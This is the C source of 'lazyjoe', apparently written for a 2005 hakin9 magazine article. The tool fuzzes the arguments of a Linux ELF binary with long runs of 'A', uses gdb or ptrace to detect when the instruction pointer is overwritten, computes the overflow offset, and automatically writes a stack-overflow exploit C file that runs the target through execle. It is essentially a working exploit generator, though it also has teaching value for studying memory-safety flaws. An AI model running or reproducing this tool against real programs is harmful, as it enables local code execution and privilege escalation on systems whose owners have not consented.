/*
    lazyjoe v1.1-hakin9 -- arguments testing tool for elf executables
    Copyright (C) 2005 Lekkas Stavros <xfactor @ linuxmail.org>
    
    This program has been designed for the purposes of a hakin9 article.
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <elf.h>
#include <getopt.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/ptrace.h>
#include <linux/user.h>
#include "libjoe.h"

int main(int argc, char *argv[])
{
 char   *vulnfile = NULL,
        *expfile  = NULL,
        c, 
        *exploit;
 LINT   buf_limit = DEF_LIMIT,
        distance;
 // $i corresponds to a custom arg_limit,
 // if u have altered the value in the header
 // change the data type to include the new range
 // of values       
 int    i, 
        arg_limit = DEF_ARGS;
 double total;
 
 while ( (c = getopt(argc, argv, "e:o:l:a:vm:")) > 0 )
 {
  switch(c)
  {
   case 'e':
   case 'E':
            vulnfile = (char *) optarg;

            if ( exists(vulnfile) == -1 )
            {
             fprintf(stderr, "[!] No such file: %s\n", vulnfile);
             return EXIT_FAILURE;
            } 

            switch( is_exec_ELF(vulnfile) )
            {
             case -1:
                     fprintf(stderr, "[!] File {%s} is not an executable ELF.\n", vulnfile);
                     return EXIT_FAILURE;
             case -2:
                     return EXIT_FAILURE;
             default:
                     break;
            } 
            break;
   case 'o':
   case 'O':
            expfile = (char *) optarg;

            break;
   case 'l':
   case 'L':
            buf_limit = atol(optarg);
       
            if( buf_limit > MAX_LIMIT )
	    {
	     fprintf(stderr, "[!] Maximum buffer limit is %ld\n", MAX_LIMIT);
	     return EXIT_FAILURE;
	    }
	      
            if( buf_limit <= 0 )
            {
             fprintf(stderr, "[!] Limit must be greater than zero.\n");
             return EXIT_FAILURE;
            }
	    break;
   case 'a':
   case 'A':
            arg_limit = atoi(optarg);

            if( arg_limit > MAX_ARGS )
            {
	     fprintf(stderr, "[!] Maximum arguments number to test is %d\n", MAX_ARGS);
	     return EXIT_FAILURE;
	    }
	      
            if( arg_limit <= 0 )
            {
             fprintf(stderr, "[!] Arguments number must be greater than zero.\n");
             return EXIT_FAILURE;
            }
	    break;
   case 'm':
   case 'M':
            mode = atoi(optarg);

            if( (mode < 1) || (mode > 2) )
            {
             fprintf(stderr, "[!] Available modes are 1 and 2.\n");
             return EXIT_FAILURE;
            }
            break; 
   case 'v':
   case 'V': 
            verbose++;
            fprintf(stdout, "[+] Verbosity is on.\n");
            break;
    default:
            usage(argv[0]);
  }
 }

 if ( vulnfile == NULL || expfile == NULL )
     usage(argv[0]);
 
 if(mode == 1)
    fprintf(stdout, "[+] Pipes mode is on.\n");
 else
    fprintf(stdout, "[+] Ptrace() mode is on.\n");
 
 fprintf(stdout, "[+] Testing executable %s.\n", vulnfile); 
 gettimeofday(&tv_start, NULL);

 for( i = 1; i <= arg_limit; i++ )
 {
  fprintf(stdout,"\n[+] Testing argument %d\n", i);
    
  switch( distance = ( LINT )find_dist(vulnfile, buf_limit, i) )
  {
   case -2:
           if(ttyd)
              close(ttyd);
          
           fprintf(stderr, "[-] Testing of executable finished due to error.\n");

           return EXIT_FAILURE;
   case -1:
           if(ttyd)
              close(ttyd);
              
           fprintf(stdout, "[-] Testing of argument %d finished with no results.\n", i);
                   
           break;
   default:
           fprintf(stdout, "[+] Binary seems to be vulnerable at argument %d.\n", i);
           fprintf(stdout, "[+] Magic distance found to be %ld.\n", distance);
           
           if( !(exploit = (char *)malloc(strlen(expfile) + sizeof(int) + 2 * sizeof(char) + 1)))
           //                             eg: "exploit"   + arg      +   ".c"           + \0
           //                                                  
           {
            fprintf(stderr, "[!] main(): malloc() error.\n");
            return EXIT_FAILURE;
           }
           CLEAR(exploit);
           sprintf(exploit, "%s%d.c", expfile, i);
           
           if( write_exp(exploit, vulnfile, distance, i) == -1 )
              fprintf(stderr, "[-] Cannot write the exploit code.\n"); 
          
           fprintf(stdout, "[+] Exploit code %s written successfully.\n", exploit);
  }
 }
 if(ttyd)
    close(ttyd);
 
 gettimeofday(&tv_end, NULL);
 total = (double) (tv_end.tv_sec + tv_end.tv_usec/1000000.0) - \
         (double) (tv_start.tv_sec + tv_start.tv_usec/1000000.0);
 fprintf(stdout,"\n[+] Total testing time: %.8f seconds.\n\n", total);

 return EXIT_SUCCESS;
}

int check_for_tools(void)
{
 //returns: 0 ~ all tools present
 //        -1 ~ tool missing
 
 FILE *fd; 
 char *tools[4] = {GDB, GREP, AWK, 0};
 int  i;

 for(i = 0; i < TOOL_NUM; i++)
 {
  if( exists(tools[i]) == -1 )
  {
   fprintf(stderr, "[-] Tool missing: %s\n", tools[i]);
   return -1;
  }
 }
 fprintf(stdout, "[+] All appropriate tools found.\n");
 return 0;
}

void printfixed(unsigned long address)
{
 char byte;
 char bit;
 
 byte = (address & 0xff000000) >> 24;
 bit  = (address & 0xf0000000) >> 28;
 
 printf("(0x");

 if( (bit == 0x00) && (byte != 0x00) )
       printf("0%lx", address);
 else
 if( byte == 0x00 )
    printf("00%lx", address);
 else
    printf("%lx", address);

 printf(")\n");

 return;
}
   
int address_status(u_long address)
{
 //returns: 1 ~ address is of the form 0x[0-3,5-f|0-3,5-f]414141
 //         0 ~ address is of the form 0x41414141
 //        -1 ~ all the other possible forms
 char byte;
 int val = -1;
  
 byte = (address & 0xff000000) >> 24 ; 
 
 if( ((address & 0x000000ff) == 0x41) && \
     ((address & 0x0000ff00) >> 8 == 0x41) && \
     ((address & 0x00ff0000) >> 16 == 0x41) )
     val = 1;
    
    if( (val == 1) && (byte != 0x41) )
       return 1;
    else
    if( (val == 1) && (byte == 0x41) )
       return  0;  
        
 return val;
}

int exec_and_inspect_1(char *buffer, int arg, char *vulnfile)
{
 //returns: -2 ~ internal error
 //         -1 ~ not a smash
 //          0 ~ definately a smash :)
 //          1 ~ probably a smash
 
 char   tmp[512], 
        bufresponse[64];
 int    inspec_val,
        i;
 FILE   *fd;
 u_long address;

 close(2); // gdb prints to stderr

 if( (fd = fopen(CMDF, "w+")) == NULL )
 {
  ttyd = open("/dev/tty", O_RDONLY);
  fprintf(stderr, "[!] exec_and_inspect_1(): error creating gdb command file.\n");
  fflush(stderr);
  return -2;
 }
 fprintf(fd, "r ");
 for(i = 0; i < arg - 1; i++)
     fprintf(fd, "foo ");

 fprintf(fd, "%s\nquit\n", buffer);
 fclose(fd);
   
 CLEAR(tmp);
 snprintf(tmp, 511, "%s %s --command=%s|%s 0x | %s {'print $1'} > %s", GDB, vulnfile, CMDF, GREP, AWK, RETF);  
   
 system(tmp);
 unlink(CMDF);
   
 CLEAR(bufresponse);
 if( (fd = fopen( RETF, "r")) == NULL )
 {
  ttyd = open("/dev/tty", O_RDONLY);
  fprintf(stderr, "[!] exec_and_inspect_1(): error reading gdb output file.\n");
  fflush(stderr);
  return -2;
 } 
 fgets(bufresponse, 63, fd);
 fclose(fd);
 address = strtoul(bufresponse, 0, 16);

 if(verbose)
    fprintf(stdout, "-> Buffer len: %ld\n", strlen(buffer));

 switch( address_status( address ) )
 {
   case 0: // 0x41414141
          if( flag == 1 ) //if the 3 lsb have been overwritten previously
          {
           if(verbose)
           {
            fprintf(stdout, "-> %%eip status: definately smashed. ");
            printfixed(address);
            //fprintf(stdout, "-> FLAG: %d\n", flag);
           }
           inspec_val = 0;
          }
          else // eip smashed with the first try, this implies 2 cases.
               // 1st: gdb --command reported wrong address so we must skip
               // 2nd: fast check found a vuln buffer 
          {
           if(verbose)
           {
            fprintf(stdout, "-> %%eip status: probably smashed. ");
            printfixed(address);
            //fprintf(stdout, "-> FLAG: %d\n", flag);
           }
           inspec_val = -1;
          }
          break;
  case  1:// 3 lsb have been overwritten
          // either we are about to overwrite the %eip at next try or
          // fast check smashed 3/4 of the %eip. interesting, we should
          // force an additional round to get ensured.     
          flag = 1;
          
          if(verbose)
          {
           fprintf(stdout, "-> %%eip status: partially smashed. ");
           printfixed(address);
           //fprintf(stdout, "-> FLAG: %d\n", flag);
          }
          
          inspec_val = -1;
          break;
  case -1:          
          if(verbose)
          {
           if(address)
           {   
            fprintf(stdout, "-> %%eip status: not smashed. ");
            printfixed(address);
           }
           else
               fprintf(stdout, "-> %%eip status: not smashed. (unaccessible)\n");
              
           //fprintf(stdout, "-> FLAG: %d\n", flag);   
          }
          inspec_val = -1;
          break;
  default:
          fprintf(stderr, "[!] I shouldn't be here.\n");
          inspec_val = -2;       
 }    
 unlink(RETF);   
 
 return inspec_val;
}

int exec_and_inspect_2(char *buffer, int arg, char *vulnfile)
{
// returns: -2 ~ internal error
//          -1 ~ not a smash
//           0 ~ smash :)          

 REGISTERS regs;
 pid_t     pid;
 int       inspec_val = -1,
           wait_val,
           i = 1;
 LLONG     counter = 0;
 char      *args[MAX_ARGS] = {NULL};
 
 args[0] = "lazyjoe";
 for(i = 1; i <= arg - 1; i++)
     args[i] = "foo";
 args[i] = buffer;
 args[i+1] = NULL;
 
 switch( pid = fork() )
 {
  case -1:
          return -2;
          break;
  case  0:
          
          ptrace(PTRACE_TRACEME, 0, 0, 0);
          execv(vulnfile, args);
          break;
  default:       
          wait(&wait_val);
           
          if(verbose)
	     fprintf(stdout, "-> Buffer len: %ld\n", strlen(buffer));          
          
	  while(wait_val == 1407)
          { 
           counter++;   
           counter_tot++;
           
           if( ptrace(PTRACE_GETREGS, pid, 0, &regs) != 0 )
           {
            fprintf(stderr, "[!] ptrace(): error fetching registers.\n");
            fflush(stderr);
            return -2;
           }
           if( ptrace(PTRACE_SINGLESTEP, pid, 0, 0) != 0 )
           {
            fprintf(stderr, "[!] ptrace(): error restarting.\n");
            fflush(stderr);
            return -2;
           }

           if(verbose)
           {
            fprintf(stdout, "-> eip: %8x\r", regs.eip);
            fflush(stdout);
           }     

           if( regs.eip == 0x41414141 )
           {
            if(verbose)
            {
             fprintf(stdout, "-> Number of instructions this round: %ld\n", counter);
             fprintf(stdout, "-> Total number of instructions: %ld\n", counter_tot);
            }
            inspec_val++; //0
            kill(pid, SIGKILL);
           }   
           wait(&wait_val);
          }
 }  
 return inspec_val;
}

int exists(char *file) 
//returns:   0 ~ file exists.
//          -1 ~ file does not exist.
{
 FILE *fd;

 if( (fd = fopen(file, "r")) == NULL)
    return -1;
 
 fclose(fd);
 return 0;
}

LINT find_dist(char *vulnfile, LINT limit, int arg)
{
//returns: positive value ~ the distance
//         -2 ~ error
//         -1 ~ not vuln or not in $limit 
//
 char *p;
 LINT i,
      distance;
 int  errhandler;
 
  if(mode == 1)
    if( check_for_tools() == -1 )
       return -2;
 
 fprintf(stdout, "[+] Trying fast cheking to save time.\n");
 flag = 1;
 p = make_payload("", _APPEND, limit);
 
 if(mode == 1)
    errhandler = exec_and_inspect_1(p, arg, vulnfile);
 else
    errhandler = exec_and_inspect_2(p, arg, vulnfile);
 
 switch( errhandler )
 {
  case -2: // internal error
          free(p);
          return -2;
  case -1: // not vuln at all or not vuln in buf_limit
          free(p);
          fprintf(stdout, "[-] Fast checking assumes buffer is not vulnerable.\n");
          return -1;
  case  1:
          free(p);
          fprintf(stdout, "[+] Fast checking found a possible overflow after the defined buffer_limit\n");
          limit++; //force another round
          fprintf(stdout, "[+] Forcing one more round to get sure.\n");
          break; // ever heard of double free() heap corruption ?         
  case  0: 
          free(p);
          fprintf(stdout, "[+] Fast checking assumes buffer is vulnerable.\n");
 }         
 
 fprintf(stdout, "[+] Starting detailed test.\n");
 flag = 0;
        
 for(i = 1; i <= limit; i++)
 {
  p = make_payload("", _APPEND, i);
  
  if(mode == 1)
     errhandler = exec_and_inspect_1(p, arg, vulnfile);
  else
     errhandler = exec_and_inspect_2(p, arg, vulnfile);

  switch( errhandler )
  {
   case -2:
           free(p);
           return -2;  
   case -1:
           free(p);
           break;
   case  0:
           free(p); 
           // total overwriting minus register size to reach 
           // its start point
           return ( i - 4 );
  }
 }
 return errhandler;    
}      

int is_exec_ELF(char *file)
//
//returns: -2 ~ internal error
//         -1 ~ file not exec_elf
//          0 ~ file is exec_elf
//
{
 Elf32_Ehdr  *ehdr;
 int         fd;
 struct stat fstat_struct;
 char        *filedata;
	 
 if( (fd = open(file, O_RDONLY)) < 0 ) 
 {
  fprintf(stderr, "[!] is_exec_ELF(): read() error #1.\n");
  return -2;
 }
 
 if( (fstat(fd, &fstat_struct)) < 0 )
 {
  fprintf(stderr, "[!] is_exec_ELF(): fstat() error.\n");
  close(fd);
  return -2;
 }
 
 if( !(filedata = (char *)malloc(fstat_struct.st_size)) )
 {
  fprintf(stderr, "[!] is_exec_ELF(): malloc() error.\n");
  close(fd);
  return -2;
 }

 CLEAR(filedata);

 if( read(fd, filedata, fstat_struct.st_size) < 0 )
 {
  fprintf(stderr, "[!] is_exec_ELF(): read() error #2.\n");
  free(filedata);
  close(fd);
  return -2;
 }
 close(fd);

 ehdr	= (Elf32_Ehdr *)filedata;

 if( !(ehdr->e_type  == ET_EXEC) )
 {
  free(filedata);
  return -1;
 }
 free(filedata);
 return 0;
}

// restrictions: my_buffer must be freed outside the textual
// level of the function using a pointer with pass by reference
// 
// eg: char *p;
//     p = make_payload("foo", _APPEND, 1);
//     free(p);
//
char *make_payload(char *buffer, int policy, LINT num)
// policies:
//          _APPEND ~ append $num 'A'[s]
//          _REMOVE ~ remove $num 'A'[s]
{
 char *my_buffer;
 LINT i,
      len;
 
 len = strlen(buffer);
 
 if( policy == _APPEND )
 {
  if( !(my_buffer = (char *)malloc( len + num + 1 )) ) 
  {
   fprintf(stderr, "[!] make_payload(): malloc() append error.\n");
   exit(EXIT_FAILURE);
  }
  CLEAR(my_buffer);
  
  if( len != 0 )
     for( i = 0; i < len; i++ )
         my_buffer[i] = *(buffer++); 
   
  for( i = len; i < len + num; i++ )
      my_buffer[i] = 'A';
   
  my_buffer[i] = 0x00;
 }

 if( policy == _REMOVE )
 {  
  if( !(my_buffer = (char *)malloc( len - num + 1 )) )
  {
   fprintf(stderr, "[!] make_payload(): malloc() remove error.\n");
   exit(EXIT_FAILURE);
  }
  CLEAR(my_buffer);   
 
  for( i = 0; i < len - num; i++ )
      my_buffer[i] = *(buffer++);
  
  my_buffer[i] = 0x00;
 } 

 return my_buffer;
}

void usage(char *my_name)
{
 fprintf(stderr, "\n[%s - %s] - [%s]\n"
                 "----------------------------------------------------\n\n"
                 "Usage: %s -e <file> -o <file> [-l <num>] [-a <num>] [-v] [-m <num>]\n\n"
                 "\t -e <file>  : Executable ELF to test.\n"
                 "\t -o <file>  : Desired name of exploit code with no extension.\n"
                 "\t -l <number>: Set limit for buffer length, default: %d.\n"
                 "\t -a <number>: Set how many arguments to test, default: %d.\n"
                 "\t -v         : Be verbose.\n"
                 "\t -m <number>: 1 ~ Pipes mode, 2 ~ ptrace() mode, default: 1.\n\n",\
                 NAME, VERSION, AUTHORS_EMAIL, my_name, DEF_LIMIT, DEF_ARGS);

 exit(EXIT_FAILURE);
}                 

int write_exp(char *exp, char *vuln, LINT dist, int arg)
{
 FILE *fd;
 int  i;

 if( (fd = fopen(exp, "w+")) == NULL )
 {
  fprintf(stderr, "[!] write_exp(): fopen() error.\n");
  return -1;
 }

 fprintf(fd, EXP_BAN, vuln, arg);  
 fprintf(fd, LNX_EXP, vuln, dist);
 fprintf(fd, "execle(BIN, BIN, ");

 for(i = 0; i < arg - 1; i++)
     fprintf(fd, "\"foo\", ");
 
 fprintf(fd, "buffer, 0, env);\n return 0;\n}\n\n");
 
 fclose(fd);

 return 0;
}
 